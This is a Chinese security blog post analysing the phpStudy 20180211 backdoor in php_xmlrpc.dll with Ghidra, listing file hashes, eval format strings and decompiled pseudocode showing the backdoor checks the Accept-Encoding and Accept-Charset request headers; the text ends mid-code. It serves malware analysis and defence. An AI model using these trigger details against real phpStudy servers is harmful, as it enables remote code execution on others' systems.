**作者：lu4nx@知道创宇404积极防御实验室  
作者博客：[《使用 Ghidra 分析 phpStudy
后门》](https://www.shellcodes.org/Hacking/%E4%BD%BF%E7%94%A8Ghidra%E5%88%86%E6%9E%90phpStudy%E5%90%8E%E9%97%A8.html
"《使用 Ghidra 分析 phpStudy 后门》")**
这次事件已过去数日，该响应的也都响应了，虽然网上有很多厂商及组织发表了分析文章，但记载分析过程的不多，我只是想正儿八经用 Ghidra 从头到尾分析下。
## 1 工具和平台
主要工具：
  * Kali Linux
  * Ghidra 9.0.4
  * 010Editor 9.0.2
样本环境：
  * Windows7
  * phpStudy 20180211
## 2 分析过程
先在 Windows 7 虚拟机中安装 PhpStudy 20180211，然后把安装完后的目录拷贝到 Kali Linux 中。
根据网上公开的信息：后门存在于 php_xmlrpc.dll 文件中，里面存在“eval”关键字，文件 MD5 为
c339482fd2b233fb0a555b629c0ea5d5。
因此，先去找到有后门的文件：
    lu4nx@lx-kali:/tmp/phpStudy$ find ./ -name php_xmlrpc.dll -exec md5sum {} \;
    3d2c61ed73e9bb300b52a0555135f2f7  ./PHPTutorial/php/php-7.2.1-nts/ext/php_xmlrpc.dll
    7c24d796e0ae34e665adcc6a1643e132  ./PHPTutorial/php/php-7.1.13-nts/ext/php_xmlrpc.dll
    3ff4ac19000e141fef07b0af5c36a5a3  ./PHPTutorial/php/php-5.4.45-nts/ext/php_xmlrpc.dll
    c339482fd2b233fb0a555b629c0ea5d5  ./PHPTutorial/php/php-5.4.45/ext/php_xmlrpc.dll
    5db2d02c6847f4b7e8b4c93b16bc8841  ./PHPTutorial/php/php-7.0.12-nts/ext/php_xmlrpc.dll
    42701103137121d2a2afa7349c233437  ./PHPTutorial/php/php-5.3.29-nts/ext/php_xmlrpc.dll
    0f7ad38e7a9857523dfbce4bce43a9e9  ./PHPTutorial/php/php-5.2.17/ext/php_xmlrpc.dll
    149c62e8c2a1732f9f078a7d17baed00  ./PHPTutorial/php/php-5.5.38/ext/php_xmlrpc.dll
    fc118f661b45195afa02cbf9d2e57754  ./PHPTutorial/php/php-5.6.27-nts/ext/php_xmlrpc.dll
将文件 ./PHPTutorial/php/php-5.4.45/ext/php_xmlrpc.dll 单独拷贝出来，再确认下是否存在后门：
    lu4nx@lx-kali:/tmp/phpStudy$ strings ./PHPTutorial/php/php-5.4.45/ext/php_xmlrpc.dll | grep eval
    zend_eval_string
    @eval(%s('%s'));
    %s;@eval(%s('%s'));
从上面的搜索结果可以看到文件中存在三个“eval”关键字，现在用 Ghidra 载入分析。
在 Ghidra 中搜索下：菜单栏“Search” > “For
Strings”，弹出的菜单按“Search”，然后在结果过滤窗口中过滤“eval”字符串，如图：
![
](https://images.seebug.org/content/images/2019/10/cd0b4b01-b8b7-4c6d-8601-5b9f31967f1e.png-w331s)
从上方结果“Code”字段看的出这三个关键字都位于文件 Data
段中。随便选中一个（我选的“@eval(%s(‘%s’));”）并双击，跳转到地址中，然后查看哪些地方引用过这个字符串（右击，References >
Show References to Address），操作如图：
![
](https://images.seebug.org/content/images/2019/10/40fcd0a1-3ea1-481a-8285-a659ed8663aa.png-w331s)
结果如下：
![
](https://images.seebug.org/content/images/2019/10/ad4a84dd-d879-4b6a-a3b4-dec5af94eee7.png-w331s)
可看到这段数据在 PUSH 指令中被使用，应该是函数调用，双击跳转到汇编指令处，然后 Ghidra 会自动把汇编代码转成较高级的伪代码并呈现在
Decompile 窗口中：
如果没有看到 Decompile 窗口，在菜单Window > Decompile 中打开。
在翻译后的函数 FUN_100031f0 中，我找到了前面搜索到的三个 eval 字符，说明这个函数中可能存在多个后门（当然经过完整分析后存在三个后门）。
这里插一句，Ghidra 转换高级代码能力比 IDA 的 Hex-Rays Decompiler 插件要差一些，比如 Ghidra 转换的这段代码：
    puVar8 = local_19f;
    while (iVar5 != 0) {
      iVar5 = iVar5 + -1;
      *puVar8 = 0;
      puVar8 = puVar8 + 1;
    }
在IDA中翻译得就很直观：
    memset(&v27, 0, 0xB0u);
还有对多个逻辑的判断，IDA 翻译出来是：
    if (a && b){
    ...
    }
Ghidra 翻译出来却是：
    if (a) {
      if(b) {
      }
    }
而多层 if 嵌套阅读起来会经常迷路。总之 Ghidra 翻译的代码只有反复阅读后才知道是干嘛的，在理解这类代码上我花了好几个小时。
### 2.1 第一个远程代码执行的后门
第一个后门存在于这段代码：
    iVar5 = zend_hash_find(*(int *)(*param_3 + -4 + *(int *)executor_globals_id_exref * 4) + 0xd8,
                           s__SERVER_1000ec9c,~uVar6,&local_14);
    if (iVar5 != -1) {
      uVar6 = 0xffffffff;
      pcVar9 = s_HTTP_ACCEPT_ENCODING_1000ec84;
      do {
        if (uVar6 == 0) break;
        uVar6 = uVar6 - 1;
        cVar1 = *pcVar9;
        pcVar9 = pcVar9 + 1;
      } while (cVar1 != '\0');
      iVar5 = zend_hash_find(*(undefined4 *)*local_14,s_HTTP_ACCEPT_ENCODING_1000ec84,~uVar6,&local_28
                             );
      if (iVar5 != -1) {
        pcVar9 = s_gzip,deflate_1000ec74;
        pbVar4 = *(byte **)*local_28;
        pbVar7 = pbVar4;
        do {
          bVar2 = *pbVar7;
          bVar11 = bVar2 < (byte)*pcVar9;
          if (bVar2 != *pcVar9) {
          LAB_10003303:
            iVar5 = (1 - (uint)bVar11) - (uint)(bVar11 != false);
            goto LAB_10003308;
          }
          if (bVar2 == 0) break;
          bVar2 = pbVar7[1];
          bVar11 = bVar2 < ((byte *)pcVar9)[1];
          if (bVar2 != ((byte *)pcVar9)[1]) goto LAB_10003303;
          pbVar7 = pbVar7 + 2;
          pcVar9 = (char *)((byte *)pcVar9 + 2);
        } while (bVar2 != 0);
        iVar5 = 0;
      LAB_10003308:
        if (iVar5 == 0) {
          uVar6 = 0xffffffff;
          pcVar9 = s__SERVER_1000ec9c;
          do {
            if (uVar6 == 0) break;
            uVar6 = uVar6 - 1;
            cVar1 = *pcVar9;
            pcVar9 = pcVar9 + 1;
          } while (cVar1 != '\0');
          iVar5 = zend_hash_find(*(int *)(*param_3 + -4 + *(int *)executor_globals_id_exref * 4) +
                                 0xd8,s__SERVER_1000ec9c,~uVar6,&local_14);
          if (iVar5 != -1) {
            uVar6 = 0xffffffff;
            pcVar9 = s_HTTP_ACCEPT_CHARSET_1000ec60;
            do {
              if (uVar6 == 0) break;
              uVar6 = uVar6 - 1;
              cVar1 = *pcVar9;
              pcVar9 = pcVar9 + 1;
            } while (cVar1 != '\0');
            iVar5 = zend_hash_find(*(undefined4 *)*local_14,s_HTTP_ACCEPT_CHARSET_1000ec60,~uVar6,
                                   &local_1c);